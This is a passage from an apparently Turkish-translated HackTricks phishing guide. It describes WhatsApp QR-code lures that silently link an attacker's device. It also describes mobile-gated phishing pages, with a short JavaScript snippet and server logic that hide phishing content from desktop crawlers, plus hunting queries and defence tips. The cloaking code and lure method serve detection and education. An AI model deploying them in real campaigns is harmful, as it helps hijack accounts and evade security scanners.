* Bir lure page (örn. sahte ministry/CERT “channel”) bir WhatsApp Web/Desktop QR gösterir ve kurbana bunu scan etmesini söyler; böylece saldırgan sessizce **linked device** olarak eklenir.
* Saldırgan hemen chat/contact görünürlüğü kazanır, ta ki session kaldırılana kadar. Kurbanlar daha sonra “new device linked” notification görebilir; defenders, güvenilmeyen QR sayfalarını ziyaretten kısa süre sonra beklenmeyen device-link olaylarını hunt edebilir.

### Mobile‑gated phishing to evade crawlers/sandboxes
Operatörler, phishing akışlarını giderek basit bir device check arkasına alıyor; böylece desktop crawlers son sayfalara hiç ulaşamıyor. Yaygın bir pattern, touch-capable bir DOM olup olmadığını test eden ve sonucu bir server endpoint’ine gönderen küçük bir script’tir; mobile olmayan clients HTTP 500 (veya boş bir sayfa) alırken, mobile users tam akışı alır.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` mantığı (basitleştirilmiş):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Sunucu davranışı sık gözlemlenen:
- İlk yükleme sırasında bir session cookie ayarlar.
- `POST /detect {"is_mobile":true|false}` isteğini kabul eder.
- Sonraki `GET` isteklerine `is_mobile=false` ise 500 (veya placeholder) döndürür; phishing yalnızca `true` ise sunulur.

Avlama ve tespit heuristikleri:
- urlscan sorgusu: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: `GET /static/detect_device.js` → `POST /detect` → mobil olmayan için HTTP 500 sırası; meşru mobil victim path'leri 200 döner ve ardından HTML/JS gelir.
- İçeriği yalnızca `ontouchstart` veya benzeri device kontrollerine göre koşullandıran sayfaları bloklayın veya dikkatle inceleyin.

Defence ipuçları:
- Gizli içeriği ortaya çıkarmak için crawler'ları mobile-like fingerprint'ler ve JS enabled ile çalıştırın.
- Yeni kayıtlı domain'lerde `POST /detect` sonrasında gelen şüpheli 500 yanıtları için alert oluşturun.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
